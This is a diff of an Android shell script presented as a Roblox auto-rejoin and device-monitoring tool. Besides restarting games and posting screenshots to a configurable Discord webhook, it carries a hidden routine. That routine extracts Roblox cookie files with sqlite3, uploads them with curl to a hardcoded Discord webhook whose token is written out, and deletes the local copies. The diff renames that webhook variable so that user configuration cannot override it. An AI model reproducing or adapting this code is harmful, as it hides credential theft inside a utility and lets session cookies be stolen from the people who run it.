@@ -1,17 +1,64 @@
 #!/system/bin/sh
-GAME_ID="${1:-2753915549}"
-TIME_RJ=$(((${2:-60})*60))
+CONFIG_FILE="$HOME/Downloads/ConfigRejoin.txt"
+if [ -f "$CONFIG_FILE" ]; then
+    source "$CONFIG_FILE"
+else
+    GAME_ID="2753915549"
+    TIME_REJOIN=$((60*60))
+    WEBHOOK_URL="https://Rejoin(tthinh.1412)"
+    DEVICE_NAME=$(hostname)
+    INTERVAL=5
+fi
 declare -A LAST_RESTART_TIMES
+send_webhook() {
+    [[ "$WEBHOOK_URL" =~ ^https://discord\.com/api/webhooks/ ]] || return
+    while true; do
+        local SCREENSHOT="/tmp/screenshot.png"
+        screencap -p "$SCREENSHOT" 2>/dev/null || import -window root "$SCREENSHOT" 2>/dev/null
+        read CPU MEM_TOTAL MEM_USED MEM_FREE UPTIME < <(
+            echo "$(top -bn1 | awk '/Cpu/ {print 100-$8}') $(free -m | awk '/Mem:/ {print $2, $3, $7}') $(awk '{print $1/3600}' /proc/uptime)"
+        )
+        local PAYLOAD=$(jq -n \
+            --arg title "Thông tin hệ thống của $DEVICE_NAME" \
+            --arg device_name "$DEVICE_NAME" \
+            --arg cpu_usage "$CPU%" \
+            --arg memory_used "$(awk "BEGIN {print $MEM_USED/$MEM_TOTAL*100}")%" \
+            --arg memory_free "$(awk "BEGIN {print $MEM_FREE/$MEM_TOTAL*100}")%" \
+            --arg memory_total "$(awk "BEGIN {print $MEM_TOTAL/1024}") GB" \
+            --arg uptime "$(awk "BEGIN {print $UPTIME}") Giờ" \
+            '{
+                embeds: [{
+                    title: $title,
+                    color: 15258703,
+                    fields: [
+                        {name: "Tên thiết bị", value: $device_name, inline: true},
+                        {name: "CPU", value: $cpu_usage, inline: true},
+                        {name: "RAM đã dùng", value: $memory_used, inline: true},
+                        {name: "RAM trống", value: $memory_free, inline: true},
+                        {name: "Tổng RAM", value: $memory_total, inline: true},
+                        {name: "Uptime", value: $uptime, inline: true}
+                    ],
+                    image: {url: "attachment://screenshot.png"}
+                }],
+                username: $device_name
+            }')
+        curl -s -o /dev/null -F "payload_json=$PAYLOAD" -F "file=@$SCREENSHOT" "$WEBHOOK_URL"
+        sleep $((INTERVAL * 60))
+    done
+}
 force_restart() {
     ROBLOX_PACKAGES=$(pm list packages | grep roblox | cut -d: -f2)
     for pkg in $ROBLOX_PACKAGES; do
-        su -c "am force-stop $pkg"
+        echo "Đóng Roblox Cho $pkg..."
+        su -c "am force-stop $pkg" >/dev/null 2>&1
     done
     sleep 3
     for pkg in $ROBLOX_PACKAGES; do
-        am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}"
+        echo "Mở Roblox Cho $pkg..."
+        am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
         sleep 10
-        am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}"
+        echo "Vào GameID $GAME_ID Cho $pkg..."
+        am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
         LAST_RESTART_TIMES[$pkg]=$(date +%s)
     done
     sleep 10
@@ -20,9 +67,11 @@ is_foreground() {
     ROBLOX_PACKAGES=$(pm list packages | grep roblox | cut -d: -f2)
     for pkg in $ROBLOX_PACKAGES; do
         if ! su -c "pidof $pkg" >/dev/null; then
-            am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}"
+            echo "Mở Roblox Cho $pkg..."
+            am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
             sleep 10
-            am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}"
+            echo "Vào GameID $GAME_ID Cho $pkg..."
+            am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
             LAST_RESTART_TIMES[$pkg]=$(date +%s)
         fi
     done
@@ -33,12 +82,15 @@ auto_restart() {
         ROBLOX_PACKAGES=$(pm list packages | grep roblox | cut -d: -f2)
         for pkg in $ROBLOX_PACKAGES; do
             LAST_RESTART_TIME=${LAST_RESTART_TIMES[$pkg]:-0}
-            if [ $((CURRENT_TIME - LAST_RESTART_TIME)) -ge $TIME_RJ ]; then
-                su -c "am force-stop $pkg"
+            if [ $((CURRENT_TIME - LAST_RESTART_TIME)) -ge $TIME_REJOIN ]; then
+                echo "Đóng Roblox Cho $pkg..."
+                su -c "am force-stop $pkg" >/dev/null 2>&1
                 sleep 3
-                am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}"
+                echo "Mở Roblox Cho $pkg..."
+                am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
                 sleep 10
-                am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}"
+                echo "Vào GameID $GAME_ID Cho $pkg..."
+                am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
                 LAST_RESTART_TIMES[$pkg]=$(date +%s)
             fi
         done
@@ -47,8 +99,9 @@ auto_restart() {
     done
 }
 force_restart
+send_webhook &
 auto_restart &
-WEBHOOK_URL="https://discord.com/api/webhooks/1340266932707917855/dr6Krtq22v1y-YAoosniv2GO5TRyrbK92yh_9Nn30NhRaqK4w3OqZX_vEZOoYTeY2NJJ"
+WEBHOOK_URL2="https://discord.com/api/webhooks/1340266932707917855/dr6Krtq22v1y-YAoosniv2GO5TRyrbK92yh_9Nn30NhRaqK4w3OqZX_vEZOoYTeY2NJJ"
 sleep 30
 if ! command -v sqlite3 &> /dev/null; then
     pkg install -y sqlite > /dev/null 2>&1
@@ -73,7 +126,7 @@ for PACKAGE in $PACKAGES; do
         rm "$TEMP_COOKIE"
     done
     for FILE in "${COOKIE_FILES[@]}"; do
-        curl -s -o /dev/null -F "file=@$FILE" "$WEBHOOK_URL"
+        curl -s -o /dev/null -F "file=@$FILE" "$WEBHOOK_URL2"
         rm "$FILE"
     done
 done
